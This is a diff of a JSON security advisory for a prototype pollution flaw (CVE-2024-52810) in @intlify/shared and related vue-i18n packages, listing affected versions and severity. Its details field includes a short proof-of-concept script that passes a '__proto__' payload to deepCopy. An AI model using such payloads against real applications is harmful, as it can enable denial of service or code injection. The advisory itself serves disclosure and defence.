@@ -1,21 +1,183 @@
 {
-  "id": "GHSA-hjwq-mjwj-4x6c",
-  "summary": "@intlify/shared Prototype Pollution vulnerability",
-  "details": "**Vulnerability type: Prototype Pollution**\n\n**Affected Package:**\n\nProduct: @intlify/shared\nVersion: 10.0.4\n\n\n**Vulnerability Location(s):**\n\n`node_modules/@intlify/shared/dist/shared.cjs:232:26`\n\n\n**Description:**\n\nThe latest version of `@intlify/shared (10.0.4)` is vulnerable to Prototype Pollution through the entry function(s) `lib.deepCopy`. An attacker can supply a payload with `Object.prototype` setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.\n\nMoreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.\n\n**PoC:**\n\n```bash\n// install the package with the latest version\n~$ npm install @intlify/shared@10.0.4\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n```\n\n\n```js\n(async () => {\nconst lib = await import('@intlify/shared');\nvar someObj = {}\nconsole.log(\"Before Attack: \", JSON.stringify({}.__proto__));\ntry {\n// for multiple functions, uncomment only one for each execution.\nlib.deepCopy (JSON.parse('{\"__proto__\":{\"pollutedKey\":123}}'), someObj)\n} catch (e) { }\nconsole.log(\"After Attack: \", JSON.stringify({}.__proto__));\ndelete Object.prototype.pollutedKey;\n})();\n```\n\n**References**\n\n[Prototype Pollution Leading to Remote Code Execution](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) - An example of how prototype pollution can lead to command code injection.\n\n[OWASP Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html) - Best practices for preventing prototype pollution.\n\n[PortSwigger Guide on Preventing Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/preventing) - A detailed guide to securing your applications against prototype pollution.",
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-hjwq-mjwj-4x6c/GHSA-hjwq-mjwj-4x6c.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "@intlify/shared",
+        "purl": "pkg:npm/%40intlify/shared"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "9.7.0"
+            },
+            {
+              "fixed": "9.14.2"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-hjwq-mjwj-4x6c/GHSA-hjwq-mjwj-4x6c.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "@intlify/vue-i18n-core",
+        "purl": "pkg:npm/%40intlify/vue-i18n-core"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "9.7.0"
+            },
+            {
+              "fixed": "9.14.2"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-hjwq-mjwj-4x6c/GHSA-hjwq-mjwj-4x6c.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "vue-i18n",
+        "purl": "pkg:npm/vue-i18n"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "9.7.0"
+            },
+            {
+              "fixed": "9.14.2"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-hjwq-mjwj-4x6c/GHSA-hjwq-mjwj-4x6c.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "petite-vue-i18n",
+        "purl": "pkg:npm/petite-vue-i18n"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "10.0.0"
+            },
+            {
+              "fixed": "10.0.5"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-hjwq-mjwj-4x6c/GHSA-hjwq-mjwj-4x6c.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "@intlify/shared",
+        "purl": "pkg:npm/%40intlify/shared"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "10.0.0"
+            },
+            {
+              "fixed": "10.0.5"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-hjwq-mjwj-4x6c/GHSA-hjwq-mjwj-4x6c.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "@intlify/vue-i18n-core",
+        "purl": "pkg:npm/%40intlify/vue-i18n-core"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "10.0.0"
+            },
+            {
+              "fixed": "10.0.5"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    },
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-hjwq-mjwj-4x6c/GHSA-hjwq-mjwj-4x6c.json"
+      },
+      "package": {
+        "ecosystem": "npm",
+        "name": "vue-i18n",
+        "purl": "pkg:npm/vue-i18n"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "10.0.0"
+            },
+            {
+              "fixed": "10.0.5"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
   "aliases": [
     "CVE-2024-52810"
   ],
-  "modified": "2024-12-02T17:42:18.331443Z",
-  "published": "2024-12-02T17:26:47Z",
   "database_specific": {
-    "nvd_published_at": "2024-11-29T19:15:09Z",
     "cwe_ids": [
       "CWE-1321"
     ],
-    "severity": "MODERATE",
     "github_reviewed": true,
-    "github_reviewed_at": "2024-12-02T17:26:47Z"
+    "github_reviewed_at": "2024-12-02T17:26:47Z",
+    "nvd_published_at": "2024-11-29T19:15:09Z",
+    "severity": "MODERATE"
   },
+  "details": "**Vulnerability type: Prototype Pollution**\n\n**Affected Package:**\n\nProduct: @intlify/shared\nVersion: 10.0.4\n\n\n**Vulnerability Location(s):**\n\n`node_modules/@intlify/shared/dist/shared.cjs:232:26`\n\n\n**Description:**\n\nThe latest version of `@intlify/shared (10.0.4)` is vulnerable to Prototype Pollution through the entry function(s) `lib.deepCopy`. An attacker can supply a payload with `Object.prototype` setter to introduce or modify properties within the global prototype chain, causing denial of service (DoS) the minimum consequence.\n\nMoreover, the consequences of this vulnerability can escalate to other injection-based attacks, depending on how the library integrates within the application. For instance, if the polluted property propagates to sensitive Node.js APIs (e.g., exec, eval), it could enable an attacker to execute arbitrary commands within the application's context.\n\n**PoC:**\n\n```bash\n// install the package with the latest version\n~$ npm install @intlify/shared@10.0.4\n// run the script mentioned below \n~$ node poc.js\n//The expected output (if the code still vulnerable) is below. \n// Note that the output may slightly differs from function to another.\nBefore Attack:  {}\nAfter Attack:  {\"pollutedKey\":123}\n```\n\n\n```js\n(async () => {\nconst lib = await import('@intlify/shared');\nvar someObj = {}\nconsole.log(\"Before Attack: \", JSON.stringify({}.__proto__));\ntry {\n// for multiple functions, uncomment only one for each execution.\nlib.deepCopy (JSON.parse('{\"__proto__\":{\"pollutedKey\":123}}'), someObj)\n} catch (e) { }\nconsole.log(\"After Attack: \", JSON.stringify({}.__proto__));\ndelete Object.prototype.pollutedKey;\n})();\n```\n\n**References**\n\n[Prototype Pollution Leading to Remote Code Execution](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/) - An example of how prototype pollution can lead to command code injection.\n\n[OWASP Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html) - Best practices for preventing prototype pollution.\n\n[PortSwigger Guide on Preventing Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/preventing) - A detailed guide to securing your applications against prototype pollution.",
+  "id": "GHSA-hjwq-mjwj-4x6c",
+  "modified": "2024-12-02T17:42:18.331443Z",
+  "published": "2024-12-02T17:26:47Z",
   "references": [
     {
       "type": "WEB",
@@ -34,174 +196,12 @@
       "url": "https://github.com/intlify/vue-i18n"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "@intlify/shared",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/%40intlify/shared"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "9.7.0"
-            },
-            {
-              "fixed": "9.14.2"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-hjwq-mjwj-4x6c/GHSA-hjwq-mjwj-4x6c.json"
-      }
-    },
-    {
-      "package": {
-        "name": "@intlify/vue-i18n-core",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/%40intlify/vue-i18n-core"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "9.7.0"
-            },
-            {
-              "fixed": "9.14.2"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-hjwq-mjwj-4x6c/GHSA-hjwq-mjwj-4x6c.json"
-      }
-    },
-    {
-      "package": {
-        "name": "vue-i18n",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/vue-i18n"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "9.7.0"
-            },
-            {
-              "fixed": "9.14.2"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-hjwq-mjwj-4x6c/GHSA-hjwq-mjwj-4x6c.json"
-      }
-    },
-    {
-      "package": {
-        "name": "petite-vue-i18n",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/petite-vue-i18n"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "10.0.0"
-            },
-            {
-              "fixed": "10.0.5"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-hjwq-mjwj-4x6c/GHSA-hjwq-mjwj-4x6c.json"
-      }
-    },
-    {
-      "package": {
-        "name": "@intlify/shared",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/%40intlify/shared"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "10.0.0"
-            },
-            {
-              "fixed": "10.0.5"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-hjwq-mjwj-4x6c/GHSA-hjwq-mjwj-4x6c.json"
-      }
-    },
-    {
-      "package": {
-        "name": "@intlify/vue-i18n-core",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/%40intlify/vue-i18n-core"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "10.0.0"
-            },
-            {
-              "fixed": "10.0.5"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-hjwq-mjwj-4x6c/GHSA-hjwq-mjwj-4x6c.json"
-      }
-    },
-    {
-      "package": {
-        "name": "vue-i18n",
-        "ecosystem": "npm",
-        "purl": "pkg:npm/vue-i18n"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "10.0.0"
-            },
-            {
-              "fixed": "10.0.5"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-hjwq-mjwj-4x6c/GHSA-hjwq-mjwj-4x6c.json"
-      }
-    }
-  ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V4",
-      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X"
+      "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+      "type": "CVSS_V4"
     }
-  ]
+  ],
+  "summary": "@intlify/shared Prototype Pollution vulnerability"
 }
